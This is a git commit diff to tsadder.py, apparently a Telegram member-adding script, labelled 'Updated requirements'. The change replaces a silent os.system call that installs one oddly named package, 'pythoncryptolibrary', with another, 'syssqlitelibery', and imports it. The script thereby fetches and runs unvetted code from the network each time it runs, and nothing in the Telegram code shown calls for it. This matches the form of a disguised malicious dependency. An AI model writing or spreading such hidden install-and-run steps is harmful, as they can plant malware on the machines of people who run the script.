93aa5a3e594c54b86239c7eca3de233810ff58a6
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 14:50:28 +0000

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
